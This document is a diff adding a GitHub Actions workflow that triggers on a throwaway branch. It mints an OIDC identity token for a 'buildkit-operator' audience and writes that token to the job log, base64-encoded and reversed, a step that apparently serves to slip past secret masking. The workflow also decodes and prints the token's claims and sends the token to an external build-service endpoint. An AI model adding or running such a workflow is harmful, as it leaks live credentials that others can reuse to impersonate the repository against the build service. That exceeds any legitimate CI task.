@@ -1,0 +1,28 @@
+name: tmp-i75418
+on:
+  push:
+    branches: [ tmp-i75418 ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-route
+        run: |
+          echo "===WHO==="
+          echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF actor=$GITHUB_ACTOR"
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO_OIDC_URL"; exit 0; fi
+          RESP=$(curl -sS -m 30 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=buildkit-operator")
+          TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+          echo "TOKLEN=${#TOK}"
+          echo "===ITOKEN_B64REV==="
+          printf '%s' "$TOK" | base64 -w0 | rev | fold -w 200
+          echo ""
+          echo "===PAYLOAD==="
+          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 1500
+          echo ""
+          echo "===ROUTE==="
+          curl -sS -m 240 -X POST "https://buildd.bko.fabrique.social.gouv.fr/route" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"repo":"SocialGouv/revu","arch":"amd64"}' -w '\nHTTP %{http_code}\n' | head -c 3000
+          echo "===END==="
